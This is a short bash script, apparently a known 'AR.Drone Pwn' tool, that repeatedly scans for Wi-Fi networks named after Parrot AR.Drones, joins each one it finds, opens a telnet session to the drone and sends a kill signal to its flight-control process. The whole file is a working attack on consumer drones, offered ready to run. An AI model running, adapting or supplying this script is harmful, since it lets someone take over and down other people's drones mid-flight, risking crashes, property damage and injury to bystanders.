#!/bin/bash

IFACE=$1
INTERVAL=$2

if [ -n "$IFACE" ]; then
	echo "Using interface: $IFACE"
else
	echo "AR.Drone Pwn script version 1.1, originally by Darren Kitchen"
	echo "Usage: dronekiller.sh <interface> <interval in seconds>"
	echo ""
	exit
fi

if [ -n "$INTERVAL" ]; then
	echo "Using interval: $INTERVAL seconds"
else
	echo "Using default interval: 30 seconds"
	INTERVAL=30
fi

while true; do
	echo "Scanning..."
	iw $IFACE scan | grep SSID | awk '{print $2}' | grep [a]rdrone | while read -r ssid ; do
		if ! [[ $ssid == "" ]]; then
			echo "Drone found! SSID: \"$ssid\". Connecting..."
			iwconfig $IFACE essid $ssid
			sleep 2
			echo "Testing wireless association..."
			if ! ( iwconfig $IFACE | grep $ssid ); then
				echo "Association to \"$ssid\" failed."
			else
				echo "Association to \"$ssid\" success!"
				echo "Setting static IP address..."
				ifconfig $IFACE 192.168.1.5 netmask 255.255.255.0 up
				sleep 2
				echo "Testing IP connection..."
				if ! ( ping -c1 192.168.1.1 | grep from ); then
					echo "IP connection failed."
				else
					echo "IP connection success!"
					echo "Connecting to the telnet service..."
					empty -f -i /tmp/drone_input.fifo -o /tmp/drone_output.fifo -p /tmp/drone_empty.pid telnet 192.168.1.1
					echo "Sending kill command..."
					empty -w -i /tmp/drone_output.fifo -o /tmp/drone_input.fifo BusyBox "kill -KILL `pidof program.elf`n"
					kill `pidof empty`
					echo "Kill command sent."
				fi
			fi
		else
			echo "No drones found."
		fi
	done
	sleep $INTERVAL
done
